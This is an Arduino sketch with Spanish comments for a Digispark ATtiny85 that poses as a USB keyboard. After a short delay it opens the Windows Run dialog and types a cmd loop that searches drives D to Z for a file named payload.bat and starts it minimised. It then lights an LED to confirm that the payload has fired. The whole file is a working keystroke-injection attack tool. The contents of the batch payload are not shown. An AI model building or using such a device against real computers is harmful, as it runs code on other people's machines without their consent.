#include "DigiKeyboard.h"

// LED integrado: Pin 1 para Digispark Modelo A (rev 1/2), Pin 0 para Modelo B
#define LED_PIN 1

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  // 1. Espera de enumeración con parpadeo del LED (~4 segundos)
  // Permite que Windows reconozca el ATtiny85 y monte la partición de almacenamiento masivo
  for (int i = 0; i < 4; i++) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }

  // 2. Abrir Ejecutar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);

  // 3. Empezar a escribir el comando: cmd /c "for %d in (
  DigiKeyboard.print("cmd ");
  
  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
  
  DigiKeyboard.print("c ");

  // Imprimir comillas iniciales '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("for %d in ");

  // Imprimir paréntesis abierto '(' -> Shift + 8
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT); 

  // Unidades de disco
  DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");

  // Imprimir paréntesis cerrado ')' -> Shift + 9
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); 

  // 4. Continuar con la condición: do if exist %d:/payload.bat
  DigiKeyboard.print(" do if exist %d");

  // Imprimir dos puntos ':' -> Shift + punto (keycode 0x37)
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("payload.bat start ");

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("b %d");

  // Imprimir dos puntos ':' -> Shift + 0x37
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("payload.bat");

  // Imprimir comillas finales '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 

  // 5. Ejecutar el payload completo
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 6. Encender LED fijo: confirmación visual de que el payload fue disparado
  digitalWrite(LED_PIN, HIGH);

  // Ciclo infinito pasivo para evitar re-ejecución
  for (;;) {}
}